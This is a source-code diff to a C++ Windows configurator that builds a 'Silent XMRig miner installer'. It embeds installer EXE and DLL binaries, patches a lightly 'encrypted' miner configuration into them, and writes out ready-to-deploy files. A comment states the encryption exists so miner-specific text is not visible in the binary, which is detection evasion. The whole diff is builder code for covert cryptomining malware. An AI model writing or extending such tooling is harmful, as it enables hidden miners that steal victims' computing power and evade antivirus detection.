@@ -1,5 +1,7 @@
 #include "settings.h"
 #include "dialog.h"
+#include "InstallerDLL.h"
+#include "InstallerEXE.h"
 
 minerConfig mConfig;
 
@@ -69,73 +71,55 @@ void generateSettingsForDIalog()
 	generateSettings(&mConfig, &s1);
 }
 
-void configureSilentMinerInstaller(std::string binaryName)
+void configureSilentMinerInstaller()
 {
 	TCHAR buffer[MAX_PATH] = { 0 };
 	GetModuleFileName(NULL, buffer, MAX_PATH);
 
-	std::ifstream fileIn;
-	std::ofstream fileOut;
-	std::ifstream::pos_type pos;
-	size_t size;
-	char* minerBin;
+	char* minerBinEXE;
+	char* minerBinDLL;
 	std::string errorMsg;
-	std::string outPath = std::string("configured") + binaryName;
+	std::ofstream fileOutEXE;
+	std::ofstream fileOutDLL;
+	std::string outPathEXE = std::string("configuredInstallerEXE.exe");
+	std::string outPathDLL = std::string("configuredInstallerDLL.dll");
 	minerConfig* mConfigp;
 
-	//If installer bin was not found, probably configurator is located in Release dir or you are debuging
-	fileIn.open(binaryName, std::ios::binary | std::ios::ate);
-	if (fileIn.fail())
-	{
-		std::string installerDir = std::string(buffer).substr(0, std::string(buffer).find_last_of("\\/")) + "\\..\\..\\..\\Binaries\\";
-		fileIn.open(installerDir + binaryName, std::ios::binary | std::ios::ate);
-		outPath = installerDir + outPath;
-	}
+	fileOutEXE.open(outPathEXE, std::ios::binary | std::ios::trunc);
+	fileOutDLL.open(outPathDLL, std::ios::binary | std::ios::trunc);
 
-
-	if (fileIn.fail()) {
-		errorMsg = std::string("An error has occurred!\nWas not able to locate silent XMRig installer\n") + binaryName;
-		MessageBox(NULL, errorMsg.c_str(), "Error!", MB_ICONERROR | MB_OK);
-		goto ERRORCREATE;
-	}
-
-	pos = fileIn.tellg();
-	size = pos;
-
-	fileOut.open(outPath, std::ios::binary | std::ios::trunc);
-
-	minerBin = (char*)malloc(size);
-	fileIn.seekg(0, std::ios::beg);
-	fileIn.read(minerBin, size);
-
-	if (minerBin == nullptr) 
-	{
-		goto ERRORCREATE;
-	}
-
-	fileIn.close();
+	minerBinEXE = (char*)malloc(InstallerEXE_exe_len);
+	minerBinDLL = (char*)malloc(InstallerDLL_dll_len);
+	memcpy(minerBinEXE, InstallerEXE_exe, InstallerEXE_exe_len);
+	memcpy(minerBinDLL, InstallerDLL_dll, InstallerDLL_dll_len);
 
 	mConfigp = (minerConfig*)malloc(sizeof(minerConfig));
 	*mConfigp = mConfig;
 
-	//'Encrypt' structure, so no miner specific plain text is present in binary
+	//'Encrypt' structure, so miner specific plain text is not present in binary
 	configLightEncrypt(mConfigp, magickCrypt);
 
 	//Replace minerConfig structure in binary
-	replaceMinerConfig(mConfigp, &minerBin, size);
+	replaceMinerConfig(mConfigp, &minerBinEXE, InstallerEXE_exe_len);
+	replaceMinerConfig(mConfigp, &minerBinDLL, InstallerDLL_dll_len);
 
 	//Write miner installer in to file
-	if (fileOut.is_open())
+	if (fileOutEXE.is_open() && fileOutDLL.is_open())
 	{
-		fileOut.write((char*)minerBin, size);
-		fileOut.close();
+		fileOutEXE.write((char*)minerBinEXE, InstallerEXE_exe_len);
+		fileOutEXE.close();
+		fileOutDLL.write((char*)minerBinDLL, InstallerDLL_dll_len);
+		fileOutDLL.close();
+
+		MessageBox(NULL, "Created configured \"Silent XMRig miner installer\" binaries", "Success", MB_OK);
 	}
 	else 
 	{
 		goto ERRORCREATE;
 	}
 
-	free(minerBin);
+	free(minerBinEXE);
+	free(minerBinDLL);
 	free(mConfigp);
 
 	return;
@@ -186,14 +170,10 @@ void loadSettingsFromSilentMinerInstaller()
 
 		fileIn.close();
 
-		//uint64_t pNum = mConfig.pointer;
-
 		for (size_t i = 0; i < size - sizeof(minerConfig); i++) {
-			//uint64_t* p = (uint64_t*)(minerBin + i);
 
 			if (memcmp(minerBin + i, mConfig.pointer, sizeof(mConfig.pointer)) == 0)
 			{
-				//localmConfig = *((minerConfig*)minerBin + i);
 				memcpy(mConfigp, minerBin + i, sizeof(minerConfig));
 
 				configLightDecrypt(mConfigp, 54);
